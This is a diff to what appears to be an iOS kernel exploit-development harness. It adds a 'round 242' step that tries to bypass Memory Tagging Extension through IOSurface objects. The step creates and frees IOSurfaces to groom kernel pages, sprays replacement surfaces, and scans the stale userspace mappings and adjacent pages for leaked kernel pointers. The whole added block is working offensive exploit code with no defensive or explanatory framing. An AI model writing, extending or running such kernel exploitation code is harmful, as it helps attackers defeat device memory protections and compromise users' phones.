@@ -18042,6 +18042,161 @@ new_modes:
             rlog("*** Deep probe complete ***\n");
             goto done;
         }
+        if (rounds == 242) {
+            rlog("*** rounds=242: Page-level MTE bypass via IOSurface shared mapping ***\n");
+            
+            /* Strategy: 
+             * 1. Create many IOSurfaces of same size
+             * 2. Map their shared memory to userspace (IOSurfaceGetBaseAddress)
+             * 3. Record base addresses
+             * 4. Free some IOSurfaces via IOServiceClose (kernel side)
+             * 5. Read from the USERSPACE mapping — MTE doesn't apply to userspace reads
+             * 6. If freed pages get reused for kernel objects, we can read kernel data
+             *    through the still-mapped userspace view
+             */
+            
+            io_service_t svc242 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t conn242 = 0;
+            kern_return_t kr242 = IOServiceOpen(svc242, mach_task_self(), 0, &conn242);
+            rlog("  IOSurfaceRoot: svc=0x%x conn=0x%x\n", svc242, conn242);
+            
+            #define N_SURF 64
+            IOSurfaceRef surfs[N_SURF] = {0};
+            void *bases[N_SURF] = {0};
+            uint32_t sids[N_SURF] = {0};
+            
+            /* Create surfaces — use 16KB (1 page) allocation size */
+            for (int i = 0; i < N_SURF; i++) {
+                CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w=64, h=64, bpr=256, as=16384, pf=0x42475241;
+                CFNumberRef wr = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hr = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef br = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                CFNumberRef ar = CFNumberCreate(NULL, kCFNumberIntType, &as);
+                CFNumberRef fr = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), br);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), ar);
+                CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), fr);
+                surfs[i] = IOSurfaceCreate(p);
+                if (surfs[i]) {
+                    sids[i] = IOSurfaceGetID(surfs[i]);
+                    IOSurfaceLock(surfs[i], 0, NULL);
+                    bases[i] = IOSurfaceGetBaseAddress(surfs[i]);
+                    /* Fill with known pattern */
+                    memset(bases[i], 0x42 + (i & 0xF), 16384);
+                    IOSurfaceUnlock(surfs[i], 0, NULL);
+                }
+                CFRelease(p); CFRelease(wr); CFRelease(hr);
+                CFRelease(br); CFRelease(ar); CFRelease(fr);
+            }
+            rlog("  Created %d surfaces, bases[0]=%p bases[63]=%p\n",
+                 N_SURF, bases[0], bases[N_SURF-1]);
+            
+            /* Release every other surface to create holes */
+            rlog("  Releasing odd-indexed surfaces...\n");
+            for (int i = 1; i < N_SURF; i += 2) {
+                if (surfs[i]) {
+                    CFRelease(surfs[i]);
+                    surfs[i] = NULL;
+                    /* Base pointer is still mapped! */
+                }
+            }
+            
+            /* Give kernel time to reclaim pages */
+            usleep(100000);
+            
+            /* Now create new IOSurfaces to try to reuse the freed pages */
+            rlog("  Creating replacement surfaces...\n");
+            IOSurfaceRef replacements[32] = {0};
+            for (int i = 0; i < 32; i++) {
+                CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w=64, h=64, bpr=256, as=16384, pf=0x42475241;
+                CFNumberRef wr = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hr = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef br = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                CFNumberRef ar = CFNumberCreate(NULL, kCFNumberIntType, &as);
+                CFNumberRef fr = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hr);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), br);
+                CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), ar);
+                CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), fr);
+                replacements[i] = IOSurfaceCreate(p);
+                CFRelease(p); CFRelease(wr); CFRelease(hr);
+                CFRelease(br); CFRelease(ar); CFRelease(fr);
+            }
+            
+            /* Check if old mappings now show different data */
+            rlog("  Checking old mappings for data changes:\n");
+            int changes = 0;
+            for (int i = 1; i < N_SURF; i += 2) {
+                if (bases[i]) {
+                    uint8_t expected = 0x42 + (i & 0xF);
+                    uint8_t *p = (uint8_t*)bases[i];
+                    int match = 1;
+                    for (int j = 0; j < 64; j++) {
+                        if (p[j] != expected) {
+                            match = 0;
+                            break;
+                        }
+                    }
+                    if (!match) {
+                        rlog("    surf[%d] base=%p CHANGED! First 8 qwords:\n", i, bases[i]);
+                        uint64_t *qp = (uint64_t*)bases[i];
+                        for (int k = 0; k < 8; k++) {
+                            rlog("      +%03d: 0x%016llx", k*8, qp[k]);
+                            if ((qp[k] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL)
+                                rlog(" *** KPTR ***");
+                            rlog("\n");
+                        }
+                        changes++;
+                    }
+                }
+            }
+            rlog("  %d surfaces showed data changes\n", changes);
+            
+            /* Also try reading from the page BEFORE each freed surface base */
+            rlog("  Checking pre-pages of freed surfaces:\n");
+            for (int i = 1; i < N_SURF && i < 10; i += 2) {
+                if (bases[i]) {
+                    uint64_t *pre = (uint64_t*)((char*)bases[i] - 4096);
+                    /* Use mach_vm_read to safely probe */
+                    vm_offset_t data = 0;
+                    mach_msg_type_number_t dataCnt = 0;
+                    kr242 = mach_vm_read(mach_task_self(), (mach_vm_address_t)pre, 4096, &data, &dataCnt);
+                    if (kr242 == 0 && dataCnt > 0) {
+                        uint64_t *dp = (uint64_t*)data;
+                        int found = 0;
+                        for (int j = 0; j < 512; j++) {
+                            if ((dp[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                rlog("    surf[%d] pre[%d]: 0x%016llx *** KPTR ***\n", i, j*8, dp[j]);
+                                found++;
+                                if (found >= 5) break;
+                            }
+                        }
+                        mach_vm_deallocate(mach_task_self(), data, dataCnt);
+                    }
+                }
+            }
+            
+            /* Cleanup */
+            for (int i = 0; i < N_SURF; i++) {
+                if (surfs[i]) CFRelease(surfs[i]);
+            }
+            for (int i = 0; i < 32; i++) {
+                if (replacements[i]) CFRelease(replacements[i]);
+            }
+            if (svc242) IOObjectRelease(svc242);
+            if (conn242) IOServiceClose(conn242);
+            
+            rlog("*** Page-level probe complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
